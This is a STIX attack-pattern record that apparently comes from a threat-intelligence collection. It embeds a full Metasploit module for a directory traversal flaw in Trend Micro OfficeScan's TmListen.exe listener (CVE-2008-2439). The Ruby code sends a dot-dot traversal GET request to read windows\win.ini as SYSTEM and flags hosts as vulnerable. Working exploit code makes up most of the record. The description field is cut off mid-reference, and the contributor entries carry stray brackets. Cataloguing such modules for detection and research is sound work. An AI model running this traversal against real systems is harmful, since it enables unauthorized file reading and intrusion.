{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--237c11f8-2f8f-4be9-bdbb-4f818a959017",
    "created": "2024-08-14T16:22:21.690063Z",
    "modified": "2024-08-14T16:22:21.690067Z",
    "name": "TrendMicro OfficeScanNT Listener Traversal Arbitrary File Access",
    "description": " This module tests for directory traversal vulnerability in the UpdateAgent function in the OfficeScanNT Listener (TmListen.exe) service in Trend Micro OfficeScan. This allows remote attackers to read arbitrary files as SYSTEM via dot dot sequences in an HTTP request.  'References'  => [ [ 'OSVDB', '48730' ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/officescan/tmlisten_traversal.rb",
            "external_id": "tmlisten_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.trendmicro.com/ftp/documentation/readme/OSCE_7.3_Win_EN_CriticalPatch_B1372_Readme.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'TrendMicro OfficeScanNT Listener Traversal Arbitrary File Access',\n      'Description' => %q{\n          This module tests for directory traversal vulnerability in the UpdateAgent\n        function in the OfficeScanNT Listener (TmListen.exe) service in Trend Micro\n        OfficeScan. This allows remote attackers to read arbitrary files as SYSTEM\n        via dot dot sequences in an HTTP request.\n      },\n      'References'  =>\n        [\n          [ 'OSVDB', '48730' ],\n          [ 'CVE', '2008-2439' ],\n          [ 'BID', '31531' ],\n          [ 'URL', 'http://www.trendmicro.com/ftp/documentation/readme/OSCE_7.3_Win_EN_CriticalPatch_B1372_Readme.txt' ],\n        ],\n      'Author'      => [ 'Anshul Pandey <anshul999[at]gmail.com>', 'aushack' ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(26122),\n      ])\n  end\n\n  def run_host(target_host)\n\n    res = send_request_raw(\n      {\n        'uri'     => '/activeupdate/../../../../../../../../../../../windows\\\\win.ini',\n        'method'  => 'GET',\n      }, 20)\n\n    if not res\n      print_error(\"No response from server\")\n      return\n    end\n\n    http_fingerprint({ :response => res })\n\n    if (res.code >= 200)\n      if (res.body =~ /for 16-bit app support/)\n        vuln = \"vulnerable.\"\n      else\n        vuln = \"not vulnerable.\"\n      end\n      if (res.headers['Server'])\n        print_status(\"http://#{target_host}:#{rport} is running #{res.headers['Server']} and is #{vuln}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Anshul Pandey <anshul999[at]gmail.com>",
        "aushack ]",
        ""
    ]
}